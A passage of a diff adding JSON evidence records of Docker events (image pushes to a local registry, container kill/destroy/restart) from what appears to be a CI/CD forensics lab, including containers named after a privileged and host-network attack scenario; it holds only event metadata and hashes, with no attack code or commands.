+      "details": "Type: image, Action: create, ID: sha256:df204, Name: sha256:df204ed2521bfdbc21cb8f72f2ec338d5b35aa009785d2e54010df4cf202784e",
+      "evidence_hash": "bc4ded3d72468ef77e4d3936d13af90f684379d4d20398b1fe02a696801bae32",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T05:34:09.483480",
+      "source": "Docker",
+      "event_type": "Image tag",
+      "details": "Type: image, Action: tag, ID: sha256:df204, Name: localhost:5000/dpff-sample-app:release-1.0",
+      "evidence_hash": "4fb2a4097c3a8ceae50d8ed0f5c1dbe2e459b7ec2c9dfd4b39a2d4a3da02c6c4",
+      "collected_at": "2026-02-19T13:31:33.959234"
+    },
+    {
+      "timestamp": "2026-02-19T05:34:10.576396",
+      "source": "Docker",
+      "event_type": "Image push",
+      "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+      "evidence_hash": "9d7b05894a37d263423323c77546c8d9c65ef2065d16c5f1f48886a583e76d1c",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:34:12.592407",
+      "source": "Docker",
+      "event_type": "Image create",
+      "details": "Type: image, Action: create, ID: sha256:147a2, Name: sha256:147a211d4cd34991534e1626c2233e7455a111a3c03685038a1aedd92d194a99",
+      "evidence_hash": "1bbcbfa468c46d04b56461c8abac94e8761b0b8cf0a305d76eaf0cf7134e7667",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:34:12.612943",
+      "source": "Docker",
+      "event_type": "Image tag",
+      "details": "Type: image, Action: tag, ID: sha256:147a2, Name: localhost:5000/dpff-sample-app:release-1.0",
+      "evidence_hash": "354100c529e2bac7b50ccc5530465495ba2160af32fbb6aa91a1482a9cec5605",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:34:13.879790",
+      "source": "Docker",
+      "event_type": "Image push",
+      "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+      "evidence_hash": "e2c5d59b1cfa24ed504ba197f30a40f83c05b6e171a4d59ff659ed3b2d656464",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:39:22.308452",
+      "source": "Docker",
+      "event_type": "Container destroy",
+      "details": "Type: container, Action: destroy, ID: 85d7fb0908d8, Name: dpff-jenkins",
+      "evidence_hash": "b8c1fc093c2bbc717c2b89686bdb258f35a122e7478f868aa38591a24d3dfda9",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:39:22.374367",
+      "source": "Docker",
+      "event_type": "Container kill",
+      "details": "Type: container, Action: kill, ID: a0b4f2bcbf14, Name: dpff-gitea",
+      "evidence_hash": "7768caa3d01ad1e6993fae924d788dfb9a9edd036940b30cdcbd6eb350b55a3c",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:39:22.381193",
+      "source": "Docker",
+      "event_type": "Container kill",
+      "details": "Type: container, Action: kill, ID: 05eb2c315cde, Name: dpff-registry",
+      "evidence_hash": "35fcb9287b98aa0a4d1a750e0a9b0f4188c3b50c09c8f2d0329dd7c9b8d59f6c",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:39:22.876301",
+      "source": "Docker",
+      "event_type": "Container stop",
+      "details": "Type: container, Action: stop, ID: 05eb2c315cde, Name: dpff-registry",
+      "evidence_hash": "43e0e3e9c6e0faf67d27c06477b2760c848f8ff30df08818380e2ec051718ceb",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:39:22.891825",
+      "source": "Docker",
+      "event_type": "Container die",
+      "details": "Type: container, Action: die, ID: 05eb2c315cde, Name: dpff-registry",
+      "evidence_hash": "5e2cf6f84544dd4f1129bf98804bdf3b7120414905cb45fb9a6afb2571d61939",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:39:22.942073",
+      "source": "Docker",
+      "event_type": "Container destroy",
+      "details": "Type: container, Action: destroy, ID: 05eb2c315cde, Name: dpff-registry",
+      "evidence_hash": "fab03053a91c6fa3e8ed9cfe19ac8dbfd9e9a2499a00375ebc2bb49d28c85085",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:39:22.951416",
+      "source": "Docker",
+      "event_type": "Container stop",
+      "details": "Type: container, Action: stop, ID: a0b4f2bcbf14, Name: dpff-gitea",
+      "evidence_hash": "8e9fc54c345c365c2bbc7bd43b1bbc1c887ab7040102b53de3e332c08f051d35",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:39:22.962600",
+      "source": "Docker",
+      "event_type": "Container die",
+      "details": "Type: container, Action: die, ID: a0b4f2bcbf14, Name: dpff-gitea",
+      "evidence_hash": "90af0b0e6f6cf5f74da420618a0096f4a708f082679203f65cc42848c23edd49",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:39:23.091982",
+      "source": "Docker",
+      "event_type": "Container destroy",
+      "details": "Type: container, Action: destroy, ID: a0b4f2bcbf14, Name: dpff-gitea",
+      "evidence_hash": "53232a353f12f9269f5684039cebf67023db1ac9ff3161954df7ea9ac3275448",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:39:27.228325",
+      "source": "Docker",
+      "event_type": "Container create",
+      "details": "Type: container, Action: create, ID: 24be5af3c61b, Name: dpff-gitea",
+      "evidence_hash": "ffc00ebaff3c04caed8c2ceae13ce93cd68ceede0f754c7053a73d1654b63209",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:39:27.235851",
+      "source": "Docker",
+      "event_type": "Container create",
+      "details": "Type: container, Action: create, ID: 55aa17c0ec25, Name: dpff-registry",
+      "evidence_hash": "f2f401dc8c8621772a8cd17c0144a3d8047481b028a7106c6219d93c2c3a78d4",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:39:27.389226",
+      "source": "Docker",
+      "event_type": "Container create",
+      "details": "Type: container, Action: create, ID: e4e545a887b2, Name: dpff-jenkins",
+      "evidence_hash": "1f14dd73bb5fb42b836adf3bc3c8535099f64da9ebc06a065bd4ea42917357d2",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:39:27.802817",
+      "source": "Docker",
+      "event_type": "Container start",
+      "details": "Type: container, Action: start, ID: 24be5af3c61b, Name: dpff-gitea",
+      "evidence_hash": "3dbd7c235ec875baf72015d7808848e0952754106e449e7b1e8906d974723320",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:39:27.858013",
+      "source": "Docker",
+      "event_type": "Container start",
+      "details": "Type: container, Action: start, ID: 55aa17c0ec25, Name: dpff-registry",
+      "evidence_hash": "191b83bdb6ef53ab119070770ca3fef4c57f37ff3a5ea72b423b743d17bf7467",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:39:28.250879",
+      "source": "Docker",
+      "event_type": "Container start",
+      "details": "Type: container, Action: start, ID: e4e545a887b2, Name: dpff-jenkins",
+      "evidence_hash": "bf85e639803eb6756f925bff0f8802c3045d7b254a604773dad9c9ad5f9ecdeb",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:39:29.674858",
+      "source": "Docker",
+      "event_type": "Container die",
+      "details": "Type: container, Action: die, ID: 990a1e71281a, Name: dpff-attack-06-privileged",
+      "evidence_hash": "d41d5499106935b880fedead7a717c94df70a2774aa685e52c11170673e228b9",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:39:30.167116",
+      "source": "Docker",
+      "event_type": "Container die",
+      "details": "Type: container, Action: die, ID: 33338cbcc5f4, Name: dpff-attack-06-hostnet",
+      "evidence_hash": "51334efcc6988836374d702586de777aa9e84f9d9b43fe7f0a3615be2abc9439",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:39:59.650001",
+      "source": "Docker",
+      "event_type": "Image create",
+      "details": "Type: image, Action: create, ID: sha256:31e19, Name: sha256:31e19d00c24266f2ba4334e1a9e90570d030bac2ff4dffda4a4f0c408bb18dbe",
+      "evidence_hash": "f45d08199163066a0e7d6fef1df7aeaf0f4200932eaeba3791ea62836b0b5315",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:39:59.670837",
+      "source": "Docker",
+      "event_type": "Image tag",
+      "details": "Type: image, Action: tag, ID: sha256:31e19, Name: localhost:5000/dpff-sample-app:release-1.0",
+      "evidence_hash": "02b882f9d86fb4605f6922394e02b51fac6719ec6011b9d3d26c4faf109246aa",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:40:00.798136",
+      "source": "Docker",
+      "event_type": "Image push",
+      "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+      "evidence_hash": "e5c497504eda7696aa77eba206eab64e6f3236787d489947d61b8530b96bc473",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:40:02.963478",
+      "source": "Docker",
+      "event_type": "Image create",
+      "details": "Type: image, Action: create, ID: sha256:f9c77, Name: sha256:f9c774d74ab87a0989c250138f5be2d4a72afce845ae0c18d08e71ebf6a33209",
+      "evidence_hash": "b694d7edfc77a3a10e12d2b2993ebcf9e6d3a0899e9f57b66e10c9a5ad61096c",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:40:02.981418",
+      "source": "Docker",
+      "event_type": "Image tag",
+      "details": "Type: image, Action: tag, ID: sha256:f9c77, Name: localhost:5000/dpff-sample-app:release-1.0",
+      "evidence_hash": "fb936e9b64ef790c567eb744f48dfc848c4ef31daa73a1f625b0541050c51472",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:40:04.022093",
+      "source": "Docker",
+      "event_type": "Image push",
+      "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+      "evidence_hash": "7116bd0f039d5d8b0fd019e4239ce1aeeccdbd9d5f763f56d3cc6e5ee8e87ef7",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:40:07.845419",
+      "source": "Docker",
+      "event_type": "Container destroy",
+      "details": "Type: container, Action: destroy, ID: 990a1e71281a, Name: dpff-attack-06-privileged",
+      "evidence_hash": "6462cfc05036890d7491559e3d8c72fba33417e7f169b1814d95c149a4300d15",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:40:08.092746",
+      "source": "Docker",
+      "event_type": "Container create",
+      "details": "Type: container, Action: create, ID: 5ec5f2e0c14d, Name: dpff-attack-06-privileged",
+      "evidence_hash": "79e8b17617706a73b021d93e07be31c90baf56c76353c4f7446efa9a38301835",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:40:08.356014",
+      "source": "Docker",
+      "event_type": "Container start",
+      "details": "Type: container, Action: start, ID: 5ec5f2e0c14d, Name: dpff-attack-06-privileged",
+      "evidence_hash": "e9caa51720b60782ff3d8bc057fad98cda9dab6105e068fb5eb0ecdf5a40c915",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:40:08.493689",
+      "source": "Docker",
+      "event_type": "Container destroy",
+      "details": "Type: container, Action: destroy, ID: 33338cbcc5f4, Name: dpff-attack-06-hostnet",
+      "evidence_hash": "1dfc8b67f87fafdf0e8a40a94eccd94df2518dea77735c6a4354d601d50f14e9",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:40:08.734406",
+      "source": "Docker",
+      "event_type": "Container create",
+      "details": "Type: container, Action: create, ID: 37913a09f720, Name: dpff-attack-06-hostnet",
+      "evidence_hash": "c4d1c2720e078b024c8fcebc54930ab02c1bf4efaa3afeff220325ef13882bbb",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:40:08.974441",
+      "source": "Docker",
+      "event_type": "Container start",
+      "details": "Type: container, Action: start, ID: 37913a09f720, Name: dpff-attack-06-hostnet",
+      "evidence_hash": "aa00331b174e8288579d3aff807c11c43fee34836aa698fc020b993e8b11c9a9",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:40:15.592174",
+      "source": "Docker",
+      "event_type": "Image create",
+      "details": "Type: image, Action: create, ID: sha256:4c148, Name: sha256:4c14854f99a8a104f66578c486caa24a33b0b921aff8a5f17154f61e3d8b3acd",
+      "evidence_hash": "6b705b3410c259b646dd3c155d7fb1d9d2755771cd5349187404f4f6dfdecc66",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:40:15.610921",
+      "source": "Docker",
+      "event_type": "Image tag",
+      "details": "Type: image, Action: tag, ID: sha256:4c148, Name: localhost:5000/dpff-sample-app:release-1.0",
+      "evidence_hash": "cf0b70398af928d55b1c7c7ee53324c4d73b2db47480922e417b57218527d7d9",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:40:16.826126",
+      "source": "Docker",
+      "event_type": "Image push",
+      "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+      "evidence_hash": "ab9e433d74e44e125d1eba87a587c22a85f4a9f01692889bc27c5549f4263aa1",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:40:18.946681",
+      "source": "Docker",
+      "event_type": "Image create",
+      "details": "Type: image, Action: create, ID: sha256:6ec6a, Name: sha256:6ec6af519974b525a0c16dc4d9ff6f1424e17892b6a129ed8b63275905d94898",
+      "evidence_hash": "c1aa07448950c6c9a71459e7c4a96b105ffc5fe7cc75ef5d5b14c50a1b4ce303",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:40:18.967959",
+      "source": "Docker",
+      "event_type": "Image tag",
+      "details": "Type: image, Action: tag, ID: sha256:6ec6a, Name: localhost:5000/dpff-sample-app:release-1.0",
+      "evidence_hash": "bf5c1b0e93b0c3ca3df0cf6c27b0a96e2776a9893f29600d3b29d5a2ddfd041e",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:40:20.123902",
+      "source": "Docker",
+      "event_type": "Image push",
+      "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+      "evidence_hash": "0851e21968aa2a43a216fbd480a1a3d6111f46a60d1efc58ea674283961e2595",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:43:50.458873",
+      "source": "Docker",
+      "event_type": "Image create",
+      "details": "Type: image, Action: create, ID: sha256:edbfd, Name: sha256:edbfdb8b2bdbe2183ecd2dfbad5e37a09c7dcdb322e4997272cc0c6e87405135",
+      "evidence_hash": "96cace506834b07fe00c036845a963f49a3f4cfce834fe7a4dea59b997242301",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:43:50.478973",
+      "source": "Docker",
+      "event_type": "Image tag",
+      "details": "Type: image, Action: tag, ID: sha256:edbfd, Name: localhost:5000/dpff-sample-app:release-1.0",
+      "evidence_hash": "260c22f4cec8328d22f82f8ad89166d7057e00c1e0d01ef9e8a5624955322033",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:43:51.576552",
+      "source": "Docker",
+      "event_type": "Image push",
+      "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+      "evidence_hash": "badeef889294772b13ebb57bc6de076b89c60e3d028fd84f9e9a53cacf90efe5",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:43:53.513875",
+      "source": "Docker",
+      "event_type": "Image create",
+      "details": "Type: image, Action: create, ID: sha256:31339, Name: sha256:3133984db5cdcd8e812ec99cdad07c3306f2d7fee890c96cd2963b9eb52905b1",
+      "evidence_hash": "3f5ebcea86ae2f6a5f8804171efa650f00a029dda30feccdd3877dafa3ef72d6",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:43:53.539302",
+      "source": "Docker",
+      "event_type": "Image tag",
+      "details": "Type: image, Action: tag, ID: sha256:31339, Name: localhost:5000/dpff-sample-app:release-1.0",
+      "evidence_hash": "8a2b98cc84d69514d3bd57c33e2ebeb190e1c6ba417fff3aae39e3d9935b99fc",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:43:55.065284",
+      "source": "Docker",
+      "event_type": "Image push",
+      "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+      "evidence_hash": "1073330525319bda44828f8b897e652559247aa7e6aa7bd9b2cdd1147b5e8e4f",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:43:58.918271",
+      "source": "Docker",
+      "event_type": "Container kill",
+      "details": "Type: container, Action: kill, ID: 5ec5f2e0c14d, Name: dpff-attack-06-privileged",
+      "evidence_hash": "27af07a484ebba9e3dc7671f36a2137fc3f538131e59f99e86e5e703ff6b2770",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:43:59.029322",
+      "source": "Docker",
+      "event_type": "Container die",
+      "details": "Type: container, Action: die, ID: 5ec5f2e0c14d, Name: dpff-attack-06-privileged",
+      "evidence_hash": "a2cc93b93446ed666788b31b32a809442011b1a593a0e564789edd587dddf052",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:43:59.075532",
+      "source": "Docker",
+      "event_type": "Container destroy",
+      "details": "Type: container, Action: destroy, ID: 5ec5f2e0c14d, Name: dpff-attack-06-privileged",
+      "evidence_hash": "f6afcf1ba1db99908cbbaa20ccf7cd059b9fac105fc95de8a518fc6d393dfd04",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:43:59.338433",
+      "source": "Docker",
+      "event_type": "Container create",
+      "details": "Type: container, Action: create, ID: 8efca21b9b81, Name: dpff-attack-06-privileged",
+      "evidence_hash": "d39a547ce7800002c14ac84fa629b2185d7fe2c446436255406579a3662b551b",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:43:59.622056",
+      "source": "Docker",
+      "event_type": "Container start",
+      "details": "Type: container, Action: start, ID: 8efca21b9b81, Name: dpff-attack-06-privileged",
+      "evidence_hash": "dc1001711a69c415aa5afe289bf37e71be8975d6f91febd749345cc057839839",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:43:59.760617",
+      "source": "Docker",
+      "event_type": "Container kill",
+      "details": "Type: container, Action: kill, ID: 37913a09f720, Name: dpff-attack-06-hostnet",
+      "evidence_hash": "48b2c3204914f77d9dff57e9182062b9b8194e8826f8236053d9924addb0f9da",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:43:59.842211",
+      "source": "Docker",
+      "event_type": "Container die",
+      "details": "Type: container, Action: die, ID: 37913a09f720, Name: dpff-attack-06-hostnet",
+      "evidence_hash": "9e78a04f0f1ff26bb3218d8d6557e07be4e493c288970539fb9763daa789fb52",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:43:59.883670",
+      "source": "Docker",
+      "event_type": "Container destroy",
+      "details": "Type: container, Action: destroy, ID: 37913a09f720, Name: dpff-attack-06-hostnet",
+      "evidence_hash": "be809a299e702f476e1ac84face70bc67f320172860152b2a2b4528c30b8cdd2",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:44:00.142712",
+      "source": "Docker",
+      "event_type": "Container create",
+      "details": "Type: container, Action: create, ID: c8bf8350780b, Name: dpff-attack-06-hostnet",
+      "evidence_hash": "c13854f0ac0c16cc1776793db63952612043e391658a3b91ab4b7c41042b5098",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:44:00.388184",
+      "source": "Docker",
+      "event_type": "Container start",
+      "details": "Type: container, Action: start, ID: c8bf8350780b, Name: dpff-attack-06-hostnet",
+      "evidence_hash": "2ed649e8a93198d6ea21cbea38a617969459cb1af58790e1a355fe9389304257",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:44:07.016220",
+      "source": "Docker",
+      "event_type": "Image create",
+      "details": "Type: image, Action: create, ID: sha256:25d4c, Name: sha256:25d4cf1e061b124796b6c41655ad14c69b32af28f9e837b7109661203c3e52d1",
+      "evidence_hash": "5d40a0ad3e9e85c0039aa96804771e52a46c1dd85d0d809ee0122ca529c94b94",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:44:07.033617",
+      "source": "Docker",
+      "event_type": "Image tag",
+      "details": "Type: image, Action: tag, ID: sha256:25d4c, Name: localhost:5000/dpff-sample-app:release-1.0",
+      "evidence_hash": "6bb64d9f929f76ee8a8954b38c2f583ab8baa5e9aad59e198d322a971e434f25",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:44:08.106554",
+      "source": "Docker",
+      "event_type": "Image push",
+      "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+      "evidence_hash": "b60184606b09e53638cca83b9d3b13d7609f1b8028bd51d3209aa126d155dbd7",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:44:10.018102",
+      "source": "Docker",
+      "event_type": "Image create",
+      "details": "Type: image, Action: create, ID: sha256:38bba, Name: sha256:38bbabd06529b5a751fb75fcf328782a16e22811b87ac3bc3d635b84106c9d55",
+      "evidence_hash": "b085f9d17d0ef0cc849f5a462e208ce548d3ecffd0e96bd9f744e87d62b82c4f",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:44:10.038119",
+      "source": "Docker",
+      "event_type": "Image tag",
+      "details": "Type: image, Action: tag, ID: sha256:38bba, Name: localhost:5000/dpff-sample-app:release-1.0",
+      "evidence_hash": "3a467cd05c3f25d186e7f4fce0d66edb3b2c8dd79634405123834a4710fb7bb1",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:44:11.220015",
+      "source": "Docker",
+      "event_type": "Image push",
+      "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+      "evidence_hash": "9ca006ebfb035853b891d21f44c087756411b5d91dcce65e3ad5aaa8f5e404bf",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:48:08.857676",
+      "source": "Docker",
+      "event_type": "Container kill",
+      "details": "Type: container, Action: kill, ID: 8efca21b9b81, Name: dpff-attack-06-privileged",
+      "evidence_hash": "80ddcfeb0da4d2376f29b06dec79f7894acb6112376fdd06eb25e0a2ac71a668",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:48:08.979396",
+      "source": "Docker",
+      "event_type": "Container die",
+      "details": "Type: container, Action: die, ID: 8efca21b9b81, Name: dpff-attack-06-privileged",
+      "evidence_hash": "b2d2bd8aaadfde6f8302c0b140fa696521cbd53c6ae33e2fc4ec416fb1d30753",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:48:09.029893",
+      "source": "Docker",
+      "event_type": "Container destroy",
+      "details": "Type: container, Action: destroy, ID: 8efca21b9b81, Name: dpff-attack-06-privileged",
+      "evidence_hash": "a7ac6517183dffc1bccc5ae9aba8d70d6112829144fc1407bec8553c567b015d",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:48:09.274523",
+      "source": "Docker",
+      "event_type": "Container create",
+      "details": "Type: container, Action: create, ID: 5fa336d76fe0, Name: dpff-attack-06-privileged",
+      "evidence_hash": "d707e773b677b624d1e6392a3bcb7b2fb48027d3d08060e9c43130ca7a1a7c40",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:48:09.522963",
+      "source": "Docker",
+      "event_type": "Container start",
+      "details": "Type: container, Action: start, ID: 5fa336d76fe0, Name: dpff-attack-06-privileged",
+      "evidence_hash": "4a5e7b9cb711eb1b63178e79b5765231fd0201146a36f127b87f8b517eb893d2",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:48:09.666614",
+      "source": "Docker",
+      "event_type": "Container kill",
+      "details": "Type: container, Action: kill, ID: c8bf8350780b, Name: dpff-attack-06-hostnet",
+      "evidence_hash": "c4990b6ba341b9da3137f9aa1d8314a08a581996616d3acf0c058761d77cdf34",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:48:09.753694",
+      "source": "Docker",
+      "event_type": "Container die",
+      "details": "Type: container, Action: die, ID: c8bf8350780b, Name: dpff-attack-06-hostnet",
+      "evidence_hash": "d53296ad8e05f704b1b3715176f8eac632707feb7efa985b8b3445b28d529deb",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:48:09.825096",
+      "source": "Docker",
+      "event_type": "Container destroy",
+      "details": "Type: container, Action: destroy, ID: c8bf8350780b, Name: dpff-attack-06-hostnet",
+      "evidence_hash": "cb4d3dd338caf99ea28582f4e64640ab80c409d8c94f1fd47ca29583acb15473",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:48:10.083595",
+      "source": "Docker",
+      "event_type": "Container create",
+      "details": "Type: container, Action: create, ID: 463d6b83847d, Name: dpff-attack-06-hostnet",
+      "evidence_hash": "b98adf2290b7c7aaf8c8782d017c8b93ae3ac71431ebf59f3d5a4b123871612a",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:48:10.333211",
+      "source": "Docker",
+      "event_type": "Container start",
+      "details": "Type: container, Action: start, ID: 463d6b83847d, Name: dpff-attack-06-hostnet",
+      "evidence_hash": "5913acbd2942983aaadc6dc27ac6f0c9d93a280b3c4d2afebe74b322167f6c01",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:52:42.457107",
+      "source": "Docker",
+      "event_type": "Container kill",
+      "details": "Type: container, Action: kill, ID: e4e545a887b2, Name: dpff-jenkins",
+      "evidence_hash": "0417103101e911bd015eb5c7aa2051f8e4500b6bc988a6651bb8dd87a25ffa39",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:52:43.316910",
+      "source": "Docker",
+      "event_type": "Container stop",
+      "details": "Type: container, Action: stop, ID: e4e545a887b2, Name: dpff-jenkins",
+      "evidence_hash": "e414a49ce017d2fd3916248bf13920756aa2d52098561e4d561c10429654526b",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:52:43.326832",
+      "source": "Docker",
+      "event_type": "Container die",
+      "details": "Type: container, Action: die, ID: e4e545a887b2, Name: dpff-jenkins",
+      "evidence_hash": "f85a588fee09259d588235ddf734032a8da661b9b938067e96adc9ec2087523f",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:52:43.381829",
+      "source": "Docker",
+      "event_type": "Container destroy",
+      "details": "Type: container, Action: destroy, ID: e4e545a887b2, Name: dpff-jenkins",
+      "evidence_hash": "b18948a4d8463aaa6a731a9bf6e8e137e99f3e1f9d9fbebf9f8330749174ce4b",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:52:43.429217",
+      "source": "Docker",
+      "event_type": "Container kill",
+      "details": "Type: container, Action: kill, ID: 24be5af3c61b, Name: dpff-gitea",
+      "evidence_hash": "4f70449ab7e4947707cbdc5e909d10d30ab03aa72d62e1b6cfcb7ce3c5939363",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
